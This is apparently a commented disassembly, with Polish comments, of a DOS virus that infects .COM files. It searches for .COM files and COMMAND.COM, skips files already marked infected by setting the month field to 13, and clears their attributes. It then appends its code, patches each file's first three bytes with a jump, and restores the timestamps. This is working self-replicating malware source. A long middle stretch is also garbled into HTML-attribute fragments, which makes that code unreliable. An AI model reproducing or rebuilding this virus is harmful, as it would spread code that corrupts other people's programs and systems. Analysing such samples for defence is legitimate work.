

RET_NEAR        MACRO
DB      0C3H
ENDM

S0000   SEGMENT
        ASSUME DS:S0000, SS:S0000 ,CS:S0000 ,ES:S0000

        org     0
L0000   label   word
        org     3
L0003   label   word
        org     4
L0004   label   word 
        org     7
l0007   label   word

        org     14h
L0014   label   word
        org     22h
L0022   label   word
        org     24h
L0024   label   word
        org     26h
L0026   label   word
        org     80h
L0080   label   word

        ORG     0100H

L0100:  JMP     L63DB                           ;0100 E9 D8 62

L0103   equ     $

L63DB:  push    ax                              ;63db 50
        mov     si,offset l6540                 ;63dc BE 40 65
        MOV     DX,SI                           ;63DF 8B D6
        ADD     SI,offset L0000                 ;63E1 81 C6 00 00
        CLD                                     ;63E5 FC
        MOV     CX,3                            ;63E6 B9 03 00
        MOV     DI,OFFSET L0100                 ;63E9 BF 00 01
        REPZ    MOVSB                           ;63EC F3 A4
        MOV     DI,DX           ;adres bazowy   ;63EE 8B FA
        MOV     AH,30H          ;DOS version    ;63F0 B4 30
        INT     21H                             ;63F2 CD 21
        CMP     AL,0            ;major vnr      ;63F4 3C 00
        JNZ     L63FB                           ;63F6 75 03
        JMP     L653A           ;-> <2.0 ;63f8="" e9="" 3f="" 01="" l63fb:="" mov="" dx,2ch="" ;l656c="" ;63fb="" ba="" 2c="" 00="" add="" dx,di="" ;+baza="" ;63fe="" 03="" d7="" mov="" bx,dx="" ;6400="" 8b="" da="" mov="" ah,1ah="" ;set="" dta="" ;6402="" b4="" 1a="" int="" 21h="" ;6404="" cd="" 21="" mov="" bp,0="" ;6406="" bd="" 00="" 00="" mov="" dx,di="" ;6409="" 8b="" d7="" add="" dx,offset="" l0007="" ;l6547="" ;640b="" 81="" c2="" 07="" 00="" l640f:="" mov="" cx,3="" ;640f="" b9="" 03="" 00="" mov="" ah,4eh="" ;find="" first="" file;6412="" b4="" 4e="" int="" 21h="" ;6414="" cd="" 21="" jmp="" l641d="" +100h="" ;6416="" e9="" 04="" 00="" l6419:="" mov="" ah,4fh="" ;find="" next="" file="" ;6419="" b4="" 4f="" int="" 21h="" ;641b="" cd="" 21="" l641d:="" jnb="" l6434="" ;-=""> O.K.        ;641D 73 15
        CMP     AL,12H          ;no more files  ;641F 3C 12
        JZ      L6426           ;-> tak         ;6421 74 03
        JMP     L6533           ;-> End         ;6423 E9 0D 01

L6426:  CMP     BP,0ffffh       ;<- koniec="" .com="" ;6426="" 83="" fd="" ff="" jnz="" l642e="" ;6429="" 75="" 03="" jmp="" l6533="" ;-=""> end         ;642B E9 05 01

L642E:  DEC     DX              ;w .COM w root  ;642E 4A
        MOV     BP,0FFFFh                       ;642F BD FF FF
        JMP     SHORT   L640F                   ;6432 EB DB
                                ;<- znaleziono="" l6434:="" mov="" cx,[bx+18h]="" ;6434="" 8b="" 4f="" 18="" and="" cx,01e0h="" ;data="" ;6437="" 81="" e1="" e0="" 01="" cmp="" cx,01a0h="" ;643b="" 81="" f9="" a0="" 01="" jz="" l6419="" ;juz="" zarazony="" ;643f="" 74="" d8="" cmp="" word="" ptr="" [bx+1ah],0fa00h="" ;6441="" 81="" 7f="" 1a="" 00="" fa="" ja="" l6419="" ;-=""> za duzy     ;6446 77 D1
        CMP     WORD PTR [BX+1AH],0100h         ;6448 81 7F 1A 00 01
        JB      L6419           ;-> za maly     ;644D 72 CA
                                ;<- zarazanie="" push="" di="" ;baza="" zmiennych="" ;644f="" 57="" mov="" si,bx="" ;dta="" ;6450="" 8b="" f3="" add="" si,1eh="" ;name="" &="" ext="" ;6452="" 83="" c6="" 1e="" add="" di,offset="" l0014="" ;l6554="" ;6455="" 81="" c7="" 14="" 00="" cmp="" bp,-1="" ;6459="" 83="" fd="" ff="" jnz="" l6461="" ;645c="" 75="" 03="" mov="" al,5ch="" ;'\'="" ;bo="" w="" root="" ;645e="" b0="" 5c="" stosb="" ;6460="" aa="" l6461:="" lodsb="" ;przepisanie="" nazwy="" ;6461="" ac="" stosb="" ;6462="" aa="" cmp="" al,0="" ;6463="" 3c="" 00="" jnz="" l6461="" ;6465="" 75="" fa="" pop="" di="" ;6467="" 5f="" mov="" dx,di="" ;6468="" 8b="" d7="" add="" dx,offset="" l0014="" ;nazwa="" zbioru="" ;646a="" 81="" c2="" 14="" 00="" mov="" ax,4300h="" ;get="" file="" attr.="" ;646e="" b8="" 00="" 43="" int="" 21h="" ;6471="" cd="" 21="" mov="" [di+offset="" l0022],cx="" ;l6562="" ;6473="" 89="" 8d="" 22="" 00="" and="" cx,offset="" lfffe="" ;6477="" 81="" e1="" fe="" ff="" mov="" dx,di="" ;647b="" 8b="" d7="" add="" dx,offset="" l0014="" ;nazwa="" zbioru="" ;647d="" 81="" c2="" 14="" 00="" mov="" ax,4301h="" ;set="" file="" attr.="" ;6481="" b8="" 01="" 43="" int="" 21h="" ;6484="" cd="" 21="" mov="" dx,di="" ;6486="" 8b="" d7="" add="" dx,offset="" l0014="" ;6488="" 81="" c2="" 14="" 00="" mov="" ax,3d02h="" ;open="" handle="" ;648c="" b8="" 02="" 3d="" int="" 21h="" ;648f="" cd="" 21="" jnb="" l6496="" ;6491="" 73="" 03="" jmp="" l652a="" ;6493="" e9="" 94="" 00="" l6496:="" mov="" bx,ax="" ;6496="" 8b="" d8="" mov="" ax,5700h="" ;get="" date="" &="" time;6498="" b8="" 00="" 57="" int="" 21h="" ;649b="" cd="" 21="" mov="" [di+offset="" l0024],cx="" ;649d="" 89="" 8d="" 24="" 00="" mov="" [di+offset="" l0026],dx="" ;64a1="" 89="" 95="" 26="" 00="" mov="" ah,3fh="" ;read="" handle="" ;64a5="" b4="" 3f="" mov="" cx,3="" ;3="" bajty="" ;64a7="" b9="" 03="" 00="" mov="" dx,di="" ;64aa="" 8b="" d7="" add="" dx,offset="" l0000="" ;adres="" l6540="" ;64ac="" 81="" c2="" 00="" 00="" int="" 21h="" ;64b0="" cd="" 21="" jnb="" l64b7="" ;64b2="" 73="" 03="" jmp="" l6511="" ;64b4="" e9="" 5a="" 00="" l64b7:="" cmp="" ax,3="" ;czy="" byly="" 3?="" ;64b7="" 3d="" 03="" 00="" jnz="" l6511="" ;64ba="" 75="" 55="" mov="" ax,4202h="" ;move="" file="" ptr="" ;64bc="" b8="" 02="" 42="" mov="" cx,offset="" l0000="" ;="">+0            ;64BF B9 00 00
        MOV     DX,CX                           ;64C2 8B D1
        INT     21H                             ;64C4 CD 21
        SUB     AX,3                            ;64C6 2D 03 00
        MOV     [DI+offset L0004],AX    ;adres skoku    ;64C9 89 85 04 00
        MOV     CX,0165h        ;liczba bajtow  ;64CD B9 65 01
        CMP     DX,0                            ;64D0 83 FA 00
        JNZ     L6511           ;->za duzy zbior;64D3 75 3C
        MOV     DX,DI                           ;64D5 8B D7
        SUB     DI,CX                           ;64D7 2B F9
        ADD     DI,2            ;+push+mov      ;64D9 83 C7 02
        ADD     AX,OFFSET L0103 ;PSP+jmp        ;64DC 05 03 01
        ADD     AX,CX                           ;64DF 03 C1
        MOV     [DI],AX                         ;64E1 89 05
        MOV     AH,40H          ;write handle   ;64E3 B4 40
        MOV     DI,DX                           ;64E5 8B FA
        SUB     DX,CX                           ;64E7 2B D1
        MOV     CX,0216h        ;cod + dane     ;64E9 B9 16 02
        INT     21H                             ;64EC CD 21
        JNB     L64F3                           ;64EE 73 03
        JMP     L6511                           ;64F0 E9 1E 00

L64F3:  CMP     AX,0216h                        ;64F3 3D 16 02
        JNZ     L6511                           ;64F6 75 19
        MOV     AX,4200h        ;move file ptr  ;64F8 B8 00 42
        MOV     CX,0            ;<+0 ;64fb="" b9="" 00="" 00="" mov="" dx,cx="" ;64fe="" 8b="" d1="" int="" 21h="" ;6500="" cd="" 21="" jb="" l6511="" ;6502="" 72="" 0d="" mov="" ah,40h="" ;write="" handle="" ;6504="" b4="" 40="" mov="" cx,3="" ;3="" znaki="" ;6506="" b9="" 03="" 00="" mov="" dx,di="" ;6509="" 8b="" d7="" add="" dx,offset="" l0003="" ;l6543="" ;650b="" 81="" c2="" 03="" 00="" int="" 21h="" ;650f="" cd="" 21="" l6511:="" mov="" cx,[di+="" offset="" l0024]="" ;6511="" 8b="" 8d="" 24="" 00="" mov="" dx,[di+="" offset="" l0026]="" ;6515="" 8b="" 95="" 26="" 00="" and="" dx,0fe1fh="" ;13="" miesiac="" ;6519="" 81="" e2="" 1f="" fe="" or="" dx,01a0h="" ;651d="" 81="" ca="" a0="" 01="" mov="" ax,5701h="" ;set="" date/time="" ;6521="" b8="" 01="" 57="" int="" 21h="" ;6524="" cd="" 21="" mov="" ah,3eh="" ;close="" handle="" ;6526="" b4="" 3e="" int="" 21h="" ;6528="" cd="" 21="" l652a:="" mov="" ax,4300h="" ;get="" attributes="" ;652a="" b8="" 00="" 43="" mov="" cx,[di+offset="" l0022]="" ;652d="" 8b="" 8d="" 22="" 00="" int="" 21h="" ;6531="" cd="" 21=""></+0><- odtworzenie="" dta="" l6533:="" mov="" dx,offset="" l0080="" ;6533="" ba="" 80="" 00="" mov="" ah,1ah="" ;6536="" b4="" 1a="" int="" 21h="" ;6538="" cd="" 21=""></-><- koniec="" l653a:="" pop="" ax="" ;653a="" 58="" mov="" di,offset="" l0100="" ;653b="" bf="" 00="" 01="" push="" di="" ;653e="" 57="" ret_near="" ;653f="" c3="" ;poprzednia="" wartosc="" 3="" pierwszych="" bajtow="" l6540="" db="" 0e9h,02dh,00dh="" ;6540="" jmp="" l7270="" ;tym="" zastapiono="" l6543="" db="" 0e9h,0d8h,062h="" ;6543="" jmp="" lc81e="" l6546="" db="" '\'="" l6547="" db="" '????????.com',0="" l6554="" db="" '\command.com',0,0="" l6562="" dw="" 0020h="" ;file="" attributes="" l6564="" dw="" 6000h="" ;time="" l6566="" dw="" 0e71h="" ;date="" db="" 0="" l6569="" db="" 0,0,0=""></-><- nowe="" dta="" l656c="" db="" 3,'????????com',3,31="" db="" 0,0="" db="" 0,0,0,46h,51h,0fh,9="" db="" 20h="" ;file="" attribute="" found="" dw="" 6000h="" ;time="" file="" was="" last="" written="" dw="" 0e71h="" ;date="" file="" was="" last="" written="" l6586="" dw="" 62dbh="" ;low="" word="" of="" file="" size="" l6588="" dw="" 0="" ;high="" word="" of="" file="" size="" l658a="" db="" 'command.com',0,0="" ;name="" and="" extension="" l6597="" db="" 'osoftyright="" micr'="" db="" 'osoftyright="" micr'="" db="" 'osoftyright="" micr'="" db="" 'osoftyright="" micr'="" db="" 'osoftyright="" microsoft="" 1988'="" org="" 0fffeh="" lfffe="" label="" word="" s0000="" ends="" end="" l0100="" =""></-></-></-></-></2.0>